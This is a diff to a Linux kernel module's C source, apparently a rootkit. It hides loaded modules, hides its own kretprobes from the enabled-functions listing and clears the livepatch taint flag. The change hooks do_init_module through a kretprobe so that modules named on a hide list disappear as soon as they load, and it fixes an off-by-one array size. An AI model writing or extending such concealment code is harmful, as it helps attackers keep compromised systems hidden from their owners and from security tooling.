@@ -94,8 +94,9 @@ struct printk_log {
 static struct module *this_module = THIS_MODULE;
 #define MAX_NUM_MODULE_NAME 10
 static int num_module_name = 0;
-static char *hidden_module_name[MAX_NUM_MODULE_NAME-1] = {NULL,};
-struct module *hidden_module_list[MAX_NUM_MODULE_NAME-1] = {NULL,};
+static int num_module_list = 0;
+static char *hidden_module_name[MAX_NUM_MODULE_NAME] = {NULL,};
+struct module *hidden_module_list[MAX_NUM_MODULE_NAME] = {NULL,};
 module_param_array(hidden_module_name, charp, &num_module_name, 0644);
 
 static int hidden_base_exe = 0;
@@ -299,13 +300,19 @@ static __attribute__((unused)) void print_hidden_module_name(void)
 {
 	int i = 0;
 
-	printk(KERN_INFO "hidden_module_name:");
+	printk(KERN_INFO "hidden_module_name %d:", num_module_name);
 	for (i = 0; i < num_module_name; i++) {
 		if (hidden_module_name[i] == NULL)
 			break;
-		printk(KERN_INFO " %s %pX", hidden_module_name[i], hidden_module_list[i]);
+		printk(KERN_INFO " %s", hidden_module_name[i] ? : "");
 	}
-	printk(KERN_INFO "\n");
+
+	printk(KERN_INFO "hidden_module_list %d:", num_module_list);
+	for (i = 0; i < num_module_list; i++) {
+		if (hidden_module_list[i] == NULL)
+			break;
+		printk(KERN_INFO " %pX", hidden_module_list[i]);
+	}
 
 	return;
 }
@@ -363,23 +370,26 @@ static void hidden_module(struct module *mod) {
 	}     
 
 	p_ddebug_remove_module(mod->name);
+
+	if (num_module_list < MAX_NUM_MODULE_NAME)
+		hidden_module_list[num_module_list++] = mod;
 }
 
 static void hidden_modules(void)
 {
 	int i = 0;
-	int j = 0;
 	char *name = NULL;
 	struct module *m = NULL;
 
-	hidden_module_name[num_module_name++] = kstrdup(THIS_MODULE->name, GFP_KERNEL);
+	if (num_module_name < MAX_NUM_MODULE_NAME)
+		hidden_module_name[num_module_name++] = kstrdup(THIS_MODULE->name, GFP_KERNEL);
+	else
+		hidden_module_name[num_module_name-1] = kstrdup(THIS_MODULE->name, GFP_KERNEL);
 
-	while ((name = hidden_module_name[i]) && i < MAX_NUM_MODULE_NAME) {
-		m = p_find_module(name);
-		if (m) {
-			hidden_module_list[j++] = m;
+	while (i < num_module_name) {
+		name = hidden_module_name[i];
+		if (name && (m = p_find_module(name)))
 			hidden_module(m);
-		}
 		i++;
 	}
 }
@@ -391,8 +401,26 @@ static int is_hidden_module(struct module *m)
 
 	if (!m)
 		goto end;
-	for (i=0; i<num_module_name; i++) {
+	for (i=0; i<num_module_list; i++) {
 		if (hidden_module_list[i] == m) {
+			ret = 1;
+			goto end;
+		}
+	}
+end:
+	return ret;
+}
+
+static int is_hidden_module_name(const char *name)
+{
+	int i = 0;
+	int ret = 0;
+
+	if (!name)
+		goto end;
+
+	for (i=0; i<num_module_name; i++) {
+		if (strcmp(hidden_module_name[i], name) == 0) {
 			ret = 1;
 			goto end;
 		}
@@ -1956,6 +1984,32 @@ static int ret_handler_do_sysinfo(struct kretprobe_instance *ri, struct pt_regs 
         return 0;
 }
 
+struct do_init_module_data {
+	struct module *m;
+};
+
+static int entry_handler_do_init_module(struct kretprobe_instance *ri, struct pt_regs *regs)
+{
+	struct do_init_module_data *data  = NULL;
+
+	data = (struct do_init_module_data *)ri->data;
+	data->m = (struct module *)regs_get_kernel_argument(regs, 0);
+
+	return 0;
+}
+
+static int ret_handler_do_init_module(struct kretprobe_instance *ri, struct pt_regs *regs)
+{
+	unsigned long retval = regs_return_value(regs);
+	struct do_init_module_data *data  = NULL;
+
+	data = (struct do_init_module_data *)ri->data;
+	if (!retval && data && data->m && is_hidden_module_name(data->m->name))
+		hidden_module(data->m);
+
+	return 0;
+}
+
 static struct kretprobe krps[] = {
 	{
 		// sys_getpriority
@@ -1973,9 +2027,18 @@ static struct kretprobe krps[] = {
 		.data_size      = sizeof(struct sysinfo_data),
                 .maxactive      = 20,
 	},
+
+	{
+		//do_init_module
+		.kp.symbol_name = "do_init_module",
+		.handler        = ret_handler_do_init_module,
+		.entry_handler  = entry_handler_do_init_module,
+		.data_size      = sizeof (struct do_init_module_data),
+		.maxactive      = 20,
+	},
 };
 
-struct kretprobe *rps[2] = {&krps[0], &krps[1]};
+struct kretprobe *rps[] = {&krps[0], &krps[1], &krps[2]};
 
 static struct klp_func funcs[] = {
 	{
@@ -2278,8 +2341,8 @@ static int livepatch_init(void)
 		hidden_from_enabled_functions_klp(objs);
 	}
 
-	register_kretprobes(rps, 2);
-	hidden_from_enabled_functions_kprobe(rps, 2);
+	register_kretprobes(rps, ARRAY_SIZE(rps));
+	hidden_from_enabled_functions_kprobe(rps, ARRAY_SIZE(rps));
 
 	clear_livepatch_tainted_mask();
 
